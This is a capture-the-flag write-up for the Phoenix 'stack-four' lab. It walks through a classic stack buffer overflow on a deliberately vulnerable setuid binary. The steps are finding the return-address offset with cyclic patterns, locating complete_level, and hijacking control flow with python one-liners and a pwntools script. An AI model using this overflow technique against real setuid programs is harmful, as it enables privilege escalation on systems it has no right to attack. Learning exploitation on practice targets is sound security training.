# Stack Four
Stack Four is the fifth challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-four`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at the output of the following output :
```
pwndbg> ! file /opt/phoenix/amd64/stack-four  
/opt/phoenix/amd64/stack-four: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux  
-musl/lib/ld-musl-x86_64.so.1, not stripped
```

#### ELF Header
The ELF Header contains important informations about a program, it's always a good idea to check it and we're going to do this now using readelf :

```
pwndbg> checksec  
[*] '/opt/phoenix/amd64/stack-four'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
   RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'
```
In this case everything seems disabled and we even have RWX segments, which means we could read, write and execute data in those segments, once again i don't think it's going to be pretty useful.

## Having a look at the instructions on the website
https://exploit.education/phoenix/stack-four
So we're going to take a look at what the website gives us as instructions before exploiting it, we could exploit it without looking at the website but i prefer doing it the right way.

The challenge description is as follows :
**Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).**

**Hints**
- The saved instruction pointer is not necessarily directly after the end of variable allocations - things like compiler padding can increase the size.
- GDB Supports "run < my_file" to direct input from my_file into the program

And we're presented the following source code
```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

Okay, so looking at the following source there is nothing really new except for that `__builtin_return_address()` function. 

For those who don't know `__builtin_return_address()` returns the return address of the current function.

We can verify that we successfully overwritten our return address using the `printf` function.

## First Run
So let's straight up run our program and see how it works even if we should already have a pretty strong understanding of how the program works by looking at the source
```
$ ./stack-four 127 ⨯  
Welcome to phoenix/stack-four, brought to you by https://exploit.education  
pwntest  
and will be returning to 0x40068d
```

So the program asks us to input something, in our case we typed `pwntest`, and the program will be returning as it's default return address since we did not overwrite our stack at all.

## Win the challenge
So this is pretty similar to what we've did so far we just need to overwrite our stack until we hit our return address, then we change that return address to the address of the `complete_level()` function.

Let's generate a `cyclic` pattern and find our return address offset.
```
$ ./stack-four <<<$(cyclic 200)   
Welcome to phoenix/stack-four, brought to you by https://exploit.education  
and will be returning to 0x6161617861616177  
zsh: segmentation fault  ./stack-four <<< $(cyclic 200)
```

Alright so we successfully overwritten our return address and therefore caused a segmentation fault.

Now there is something to take note of, we're using a 64bit program which means when we're using `%p` in `printf` we're dealing with 16 bytes instead of 8, cyclic works only with 8 bytes addresses for backward compatibility reasons, and since we're dealing with a little endian program we want only the lower bytes which is `0x61616177`. 

We can then determine our return address offset using `cyclic -l 0x61616177`
```
$ cyclic -l 0x61616177
88
```

We can make sure it's the right offset using the following command
```
$ ./stack-four <<<$(python -c 'print("A"*88 + "B"*4)')  
Welcome to phoenix/stack-four, brought to you by https://exploit.education  
and will be returning to 0x42424242  
zsh: segmentation fault  ./stack-four <<< $(python -c 'print("A"*88 + "B"*4)')
```

We successfully overwrite our return address on the stack using our 4 B's.

Now we're going to need to find the address of the `complete_level()` function, for this we'll use `objdump` but you could also use `gdb`.
```
$ objdump -D /opt/phoenix/amd64/stack-four | grep complete_level  
000000000040061d <complete_level>
```

We can see that our `complete_level` is stored at the address `000000000040061d`, if we jump to this function we should win the challenge, also note that ASLR needs to be disabled else the address of `complete_level` will change everytime we run the program, we will overcome this by making a script using `pwntools`.

## Win the challenge
Next step is to win the challenge, to do so we will use a straight input (<<<) into the program and a script we're going to make using `pwntools`

So we determined our `offset` and our `complete_level` function address, we can overwrite our return address with our `complete_level` function and therefore execute it
```
$ ./stack-four <<<$(python -c 'print("A" * 88 + "\x1d\x06\x40")') 130 ⨯  
Welcome to phoenix/stack-four, brought to you by https://exploit.education  
and will be returning to 0x40061d  
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Write the script
```py
#!/usr/bin/python3  
from pwn import *  
  
#determine offset of our return address pushed  
#on the stack at when we called start_level using cyclic pattern  
  
IO = process("/opt/phoenix/amd64/stack-four", display=None)  
COMPLETE_FUNC = ELF("/opt/phoenix/amd64/stack-four", checksec=False).symbols["complete_level"]  
COMPLETE_FUNC_ADDRESS = p64(COMPLETE_FUNC, endian="little")  
  
  
PATTERN = cyclic(200)  
IO.sendlineafter(b"https://exploit.education", PATTERN)  
IO.recvline()  
  
OFFSET = cyclic_find(int("0x" + IO.recvline().decode().split(" ")[-1].strip("0x")[8:], 16))  
log.info("OFFSET FOUND : " + str(OFFSET))  
IO.close()  
#prepare payload  
PADDING = b"A" * OFFSET  
PAYLOAD = PADDING + COMPLETE_FUNC_ADDRESS  
EXPLOITIO = process("/opt/phoenix/amd64/stack-four", display=None)  
EXPLOITIO.sendlineafter(b"https://exploit.education", PAYLOAD)  
EXPLOITIO.interactive()
```
